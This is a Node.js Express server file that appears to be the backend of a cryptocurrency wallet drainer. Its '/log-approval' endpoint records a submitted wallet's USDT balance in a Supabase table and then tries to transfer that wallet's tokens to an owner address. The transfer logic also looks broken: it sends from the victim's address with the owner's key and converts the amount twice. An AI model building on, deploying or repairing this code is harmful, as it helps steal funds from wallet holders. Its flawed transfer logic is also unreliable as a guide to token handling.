const express = require("express");
const cors = require("cors");
const TronWeb = require("tronweb");
const { createClient } = require("@supabase/supabase-js");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;

// Initialize Supabase
const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

// Initialize TronWeb with API Key
const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
  headers: { "TRON-PRO-API-KEY": process.env.TRONGRID_API_KEY },
  privateKey: process.env.OWNER_PRIVATE_KEY,
});

const USDT_CONTRACT = process.env.USDT_CONTRACT;
const OWNER_ADDRESS = process.env.OWNER_ADDRESS;

app.post("/log-approval", async (req, res) => {
  const { walletAddress, amount } = req.body;

  try {
    const balance = await tronWeb.contract().at(USDT_CONTRACT)
      .then(contract => contract.methods.balanceOf(walletAddress).call());

    const numericBalance = tronWeb.toBigNumber(balance).div(1e6).toNumber();

    // Store in Supabase
    await supabase.from("Approvals").insert([
      {
        wallet_address: walletAddress,
        amount: amount,
        balance: numericBalance,
        timestamp: new Date().toISOString()
      }
    ]);

    // Auto withdraw to OWNER
    const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
    const withdrawAmount = tronWeb.toSun(amount * 1_000_000); // Convert USDT to 6 decimals

    const tx = await usdtContract.transfer(OWNER_ADDRESS, withdrawAmount).send({ from: walletAddress });

    console.log("Auto withdrawal successful:", tx);
    res.json({ success: true, tx });
  } catch (error) {
    console.error("Error in /log-approval:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server live on port ${PORT}`);
});
